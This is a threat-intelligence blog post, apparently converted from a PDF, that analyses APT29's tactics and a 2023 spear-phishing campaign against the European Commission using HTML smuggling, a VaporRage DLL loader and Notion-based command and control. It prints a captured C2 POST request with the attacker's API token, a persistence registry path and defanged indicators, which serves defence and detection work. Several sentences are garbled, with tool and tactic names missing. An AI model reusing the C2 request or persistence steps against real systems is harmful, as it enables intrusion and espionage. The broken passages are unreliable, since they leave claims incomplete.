The group has been active\nsince at least 2008 and has been involved in a wide range of espionage and cyber-attack\ncampaigns targeting governments, military organizations, defense contractors, and\nvarious industries in the United States, Europe, and Asia.\n\nAPT29 is also known as NOBELIUM (Microsoft), Cozy Bear (Crowdstrike), The Dukes\n(Kaspersky), JACKMACKEREL (iDefense), BlueBravo (Recorded Future) and UNC2452\n(FireEye).\n\nThe group is known for its subtle and sophisticated tradecraft in stealing geopolitical\n**intelligence: unlike other Russian state-sponsored groups such as APT28 or Sandworm,**\nAPT29 has not been linked to destructive operations and operates with much more\ndiscretion.\n\nThe group has been attributed to a number of high-profile cyberattacks, including:\n\nAPT29 was one of the two Russian groups responsible for the cyberattack on the DNC\nduring the 2016 U.S. presidential election. The group gained access to the DNC’s\nemail system and stole sensitive information, which was subsequently leaked to the\npublic.\nAPT29 was attributed to the highly sophisticated supply chain attack against\nSolarWinds, a leading IT management software provider. The attack allowed the group\nto gain access to the systems of several U.S. government agencies, including the\nDepartment of Justice, the Department of State, and the Department of Homeland\nSecurity.\n\nIn May 2021, it was revealed that APT29 was responsible for a large-scale cyberattack on\n**multiple U.S. government agencies and private companies, including Microsoft. The group**\nused a compromised email marketing system to send spear-phishing emails to over 3,000\nindividual accounts, resulting in the installation of a backdoor that allowed the attackers to\n\n\n-----\n\ngain access to the victims networks. The group has also been linked to other significant\ncyberattacks, including the theft of COVID-19 research from U.S.-based pharmaceutical\ncompanies.\n\nOverall, APT29 is one of the most sophisticated and well-resourced APT groups in the world,\nand its TTPs are constantly evolving and changing.\n\n## Tactics, Techniques, and Procedures\n\nAPT29 is known for its patient and persistent targeting of its victims, often using multi-stage\nattacks that take weeks or even months to complete. Following is a list of the group’s most\nnotable TTPs:\n\nthe group uses highly targeted and convincing spear-phishing emails to gain access to\na target’s system. These emails are usually tailored to the recipient’s interests and\nappear to come from a trusted source.\nAPT29 has also been known to use watering hole attacks, where the group\ncompromises a trusted website frequented by the target, and then injects malware into\nthe site to infect visitors.\nAPT29 uses highly customized malware, such as “SeaDuke” and “CosmicDuke,” that\nare designed to evade detection and maintain persistence on the target system. The\ngroup is also known to use well-known tools like “Cobalt Strike” and “PowerShell\nEmpire”.\nthe group is known for its use of zero-day exploits to gain access to target systems. For\nexample, APT29 has been known to use exploits for popular software like Microsoft\nOffice and Adobe Flash.\nAPT29 often uses “” tactics, where the group uses legitimate tools and techniques that\nare already present on the target system to evade detection. This can include tools like\n,, and .\n\nIn this particular research, I focused on analyzing APT29’s command-and-control\ncapabilities.\n\n## Command & Control\n\nThis threat group has a history of using trusted and legitimate cloud services (such as\nsocial media services and Google Drive) for their cyber attacks in an attempt to blend into\n**normal network traffic and evade detection. Malware distributed by APT29 also contains**\nthe ability to exfiltrate data over those same C2 channels. For example:\n\nThe group’s malware searched for specific that contained URLs to access C2 servers.\nAPT29’s and malware also have the ability to use to obtain C2 URLs, as well as other\nsocial media services like and\n\n\n-----\n\nAPT29 s backdoor uses,, and for C2 communication.\n\nAPT29 has also utilized custom encryption methods, such as those found in the group’s\n**SeaDuke malware where a unique fingerprint was generated for the infected host and**\nBase64 encoding and RC4/AES encryption was used to layer data during communications\nwith their C2 server. The group has also employed techniques such as “domain fronting” and\n**TOR obfuscation plugins to create encrypted network tunnels.**\n\nUsing social networks for C2 communications is not an entirely new technique: other\nRussian groups such as Turla (Venomous Bear) leveraged comments posted to Instagram\nto obtain the address of its command and control servers.\n\nSource: FireEye, Stealthy Tactics Define a Russian Cyber Threat Group, 2015\nAPT29 was spotted using Twitter to control infected machines as early as 2015: in the\n**HAMMERTOSS campaign, the group was able to receive commands and send stolen data**\nthrough the popular social network, which allowed them to evade detection by security\nsolutions that did not monitor social media traffic.\n\n## EnvyScout\n\nIn a more recent campaign dating back to June 2021, APT29 targeted Italy diplomatic\n**organizations with a spear phishing campaign that distributed the EnvyScout backdoor.**\n\nC2 communication through Slack\nThe backdoor first calls a function to create a custom Slack channel, adding the attacker’s\nuser ID to the newly created channel. The backdoor gets the user name and hostname of the\nvictim host, adds 4 random numbers to form the name of the channel, and sends an HTTP\nrequest with an authorization token to the Slack API. After the channel is established, the\nbackdoor enters an infinite loop: it uses the “chat.postMessage” API request to send a\n**beacon message to the newly created channel and it receives a response with a list of**\nadditional files and payloads that are downloaded and executed on the target machine.\n\n## Beatdrop\n\nIn mid-January 2022, APT29 launched yet another spear phishing campaign targeting a\n**diplomatic entity, which was detected and responded to by Mandiant. During the**\ninvestigation, Mandiant discovered that the malicious emails were used to distribute the\n**BEATDROP and BOOMMIC downloaders.**\n\nBEATDROP is a downloader written in C that leverages Trello for Command-and-Control\n**(C2) communication. Trello is a web-based project management application that allows**\nusers to organize tasks and projects using customizable boards, lists, and cards.\n\n\n-----\n\nWhen executed, BEATDROP maps its own copy of ntdll.dll into memory to execute\nshellcode in its own process. It creates a suspended thread, then enumerates the system for\nthe username, computer name, and IP address to create a victim ID. This victim ID is used\nby BEATDROP to store and retrieve victim payloads from its C2. Once the victim ID is\ncreated, BEATDROP sends an initial request to Trello to determine if the current victim has\nalready been compromised. The shellcode payload is then retrieved from Trello and is\ntargeted for each victim. Once the payload has been retrieved, it is deleted from Trello.\n\n## Notion for C2 Communication\n\nIn October 2022, [ESET Research discovered a sample uploaded to VirusTotal that closely](https://www.welivesecurity.com/wp-content/uploads/2023/01/eset_apt_activity_report_t32022.pdf)\nresembled what APT29 had used a few months ago, with the key difference being that it\nused Notion, a cloud-based note-taking software platform, for Command-and-Control\n**(C&C) communications.**\n\nNotion API can be abused for C2 communications by embedding the commands into the\nNotion workspace, which is accessed by the malware as if it were a legitimate user. This\nmisuse of Notion allows the threat actors to evade detection and bypass security\n**controls, as the traffic between the malware and the Notion server is likely to be perceived**\nas legitimate traffic.\n\nESET researchers suspect that the downloader deployed in this particular campaign was\ndesigned to gather and execute additional malicious payloads, such as Cobalt Strike. The\n[campaign has been analyzed in more detail by researchers at Hive Pro and](https://www.hivepro.com/wp-content/uploads/2023/02/Uncovering-the-Threat-of-BlueBravo-with-GraphicalNeutrino-and-BEATDROP_TA2023055.pdf) Recorded\nFuture, which identify the sample as the GraphicalNeutrino malware.\n\nAccording to Recorded Future, APT29 utilized a compromised website with a lure text of\n“Ambassador’s schedule November 2022” to distribute the ZIP file “schedule.zip”, suggesting\nthat the targets of the campaign are related to embassy staff or an ambassador.\nGraphicalNeutrino, the malware used in the operation, serves as a loader with basic C2\ncapabilities and employs various anti-analysis techniques to avoid detection, including API\nunhooking and sandbox evasion.\n\nGraphicalNeutrino artifact — 140runtime.dll\nAfter establishing persistence, the malware decrypts several strings, including a Notion API\n**key and a database identifier, and calculates a unique ID for the victim based on their**\nusername and hostname. It then uses Notion’s API for C2 communication to deliver\nadditional payloads to the victim’s machine.\n\nFor each request to the C2, GraphicalNeutrino parses the JSON-formatted response and\nsearches for a “file” array; if the array is not empty, then the malware will parse out the URL\nfield, download the file and decrypt it using a custom cipher. Once the shellcode is\ndecrypted, it is indirectly spawned in a new thread.\n\n\n-----\n\nA sample response from Notion C2\nThe use of diplomatic lures during times of heightened geopolitical tensions, such as the\nongoing war in Ukraine, is likely to be effective for Russian APT groups, given the potential\nimpact of information gathered from compromised entities or individuals on Russian\nforeign policy and strategic decision-making processes. It is perhaps for this reason that\nAPT29 adopted the same tactics — in particular the stealthy C2 communication through\nNotion — for its next big campaign, this time targeting the European Commission.\n\n## Attack against the European Commission\n\nIn this final section of the blog post, I’m dissecting a previously undisclosed campaign\nattributed to APT29 which targeted the European Commission. The previous introduction to\nthe group’s TTPs and campaigns will hopefully be beneficial to the reader, as this attack\nshares quite a few similarities with the GraphicalNeutrino campaign that was exposed by\n[Recorded Future.](https://go.recordedfuture.com/hubfs/reports/cta-2023-0127.pdf)\n\n## Initial Access\n\nBeginning mid-February 2023, a spear phishing campaign targeted a number of email\naddresses related to members of the European Commission. The attack involved the\ndistribution of a malicious .iso image that contained a new sample of the VaporRage\ndownloader. Once executed, the malware was observed exploiting the Notion API to deploy\n**Cobalt Strike beacons.**\n\nExecution flow for the attack targeting the European Commission\nThe first phishing email, sent on the 13th February 2023, masqueraded as an administrative\nnotice related to documents available to download from eTrustEx, a web based exchange\nplatform that ensures secure transmission of documents between members of the\nCommission. The decoy emails are written in English and were delivered to an extremely\ntargeted number of key people that use the eTrustEx platform.\n\nLure email delivered to the European Commission\nIn addition, I noticed that in different samples of the email, the senders are probably\ncompromised email accounts belonging to legitimate government organizations. This could\nlead victims to believe that the emails came from reliable partners, making it more likely for\nrecipients to click on the links.\n\nWhen the link is opened, the victim is redirected to a malicious HTML page hosted at\n```\nhxxps://literaturaelsalvador[.]com/Instructions.html which makes use of a\n\n```\ntechnique known as HTML Smuggling to download an ISO image to the target system. I\nbelieve that this domain is not actor-owned but has been compromised, which aligns with\n[previous APT29 activity.](https://www.microsoft.com/en-us/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/)\n\n\n-----\n\nLure website\nThe ISO file is set to auto-download when the website is visited by the victim; this is\nachieved through the following JavaScript code. The contents of Instructions.iso is stored\nin the d variable.\n\nJS Code which downloads the first-stage payload\n\n## Execution\n\nOnce the file has been written to disk, when a user double-clicks on it in Windows 10 or later,\nthe image is mounted and the folder contents is displayed in Windows Explorer. The ISO\ncontains two files — a Windows shortcut file (Instructions.lnk) and a malicious DLL\n(BugSplatRc64.dll).\n\nIf the user clicks on the LNK file, the following command runs, unintentionally triggering the\nexecution of the malicious DLL.\n\nExecution of the malicious DLL\nUsing LNK shortcuts to execute malicious DLLs is a technique that has been associated to\nAPT29 in a number of campaigns. In this particular scenario, I recognized the sample as\n**[VaporRage, a downloader that has been used by APT29 since 2021.](https://www.microsoft.com/en-us/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/)**\n\n## Persistence\n\nWhen executed with the InitiateDs export, VaporRage first runs a few reconnaissance\ncommands and generates a host-id by hex-encoding the DNS domain and username. Then,\nit creates a copy of itself at:\n```\nC:\\Users\\%USERNAME%\\AppData\\Local\\DsDiBacks\\BugSplatRc64.dll\n\n```\nVaporRage creates a copy of itself\nVaporRage then establishes persistence on the compromised system by creating a registry\nrun key located at: \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DsDiBacks.\n\nVaporRage establishes persistence through a registry key\n\n## Command and Control\n\nAs I anticipated at the start of this post, the VaporRage sample delivered in the execution\nchain leverages its command-and-control by communicating over HTTPS using Notion\n**APIs. Notion’s database feature is also used to store victim information and stage further**\npayloads for download.\n\nPCAP collected during C2 communication\n\n\n-----\n\nBased on my observations, this VaporRage sample periodically executes a POST request to\nthe Notion API to check the availability of a second-stage malware payload, which is then\nretrieved and executed in memory. In this particular campaign, APT29 used VaporRage to\ndistribute Cobalt Strike beacons to further establish a foothold within the environment.\n\nFollowing is a sample POST request towards api.notion.com (104[.]18.42.99):\n```\nPOST /v1/databases/37089abc0926463182bb5343bce252cc/query HTTP/1.1\ncontent-type: application/json\naccept: application/json\nnotion-version: 2022-06-28\nauthorization: Bearer secret_X92sXCVWoTk63aPgGKlPBBmHVmuKXJ2geugKa7Ogj7s\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/35.0.1916.114 Safari/537.36\nHost: api.notion.com\nContent-Length: 79\nConnection: Keep-Alive\nCache-Control: no-cache\n {\"filter\":{\"property\":\"Name\",\"rich_text\":{\"equals\":\"VKoMr3830\"}},\"page_size\":1}\n\n```\nThis technique exemplifies APT29’s ongoing attempts to obscure its actions and maintain\n**[continuous access to target systems. This has been documented thoroughly by Mandiant,](https://www.mandiant.com/resources/blog/tracking-apt29-phishing-campaigns)**\nwho have described APT29 using a variety of techniques, including scheduled tasks, run\nkeys, malicious certificates, and in-memory backdoors, sometimes utilizing multiple\nmethods for each target.\n\nOverall, the use of cloud services such as Trello and Notion for C2 communications not\nonly provides a threat actor with increased capabilities for evasion of network security\ncontrols, but also increases resilience to law enforcement takedowns: social media and cloud\nservices are often hosted on multiple servers and locations, making it more difficult for\nauthorities to take down the entire platform. This means that the threat actor can continue to\nuse the platform for C2 communications even if some servers are taken down. These\nadvantages make it an attractive option for threat groups such as APT29 to conduct their\nmalicious activities.\n\n## Conclusions\n\nThe range of tactics, techniques, and procedures (TTPs) used by APT29 in this campaign\nsupports the conclusion that their objective is to establish numerous means of long-term\n**access to facilitate espionage-related intelligence gathering within the targeted**\ngovernment entities’ victim networks. Nations that have a connection to the Ukraine crisis,\nspecifically those with significant geopolitical, economic, or military ties to Russia or Ukraine,\nface a heightened risk of being targeted by APT29.\n\n\n-----\n\nThis threat group has shown an impressive ability to adapt swiftly during their operations.\nThey use innovative and unique methods to circumvent detection and authentication\nrequirements in their target environments. In their recent operations, the group has\ndemonstrated a deep understanding of operational security, enabling them to move\nseamlessly between on-premises and cloud resources with minimal use of malware. These\nfactors, combined with their advanced malware development skills, long history of\noperations, and extended time on targets, indicate that APT29 is a well-funded and\n**exceptionally sophisticated actor and will definitely continue to be a threat during 2023.**\n\n## IOCs\n\nFollowing is a list of indicators associated to this campaign.\n\n**Domains hxxps://literaturaelsalvador[.]com/instructions.html**\n\nhxxps://api[.]notion[.]com/v1/databases/37089abc0926463182bb5343bce252cc/query\n\n**IPs**\n\n108[.]167.180.186\n\n104[.]18.42.99\n\n**Files — SHA256**\n\n21a0b617431850a9ea2698515c277cbd95de4e59c493d0d8f194f3808eb16354\n(Instructions.iso)\n\ne957326b2167fa7ccd508cbf531779a28bfce75eb2635ab81826a522979aeb98\n(BugSplatRc64.dll)\n\nAbout the Author — Gianluca Tiepolo\n\n_I’m a cybersecurity researcher who specializes in digital forensics and incident response for_\n_the telecommunications industry.
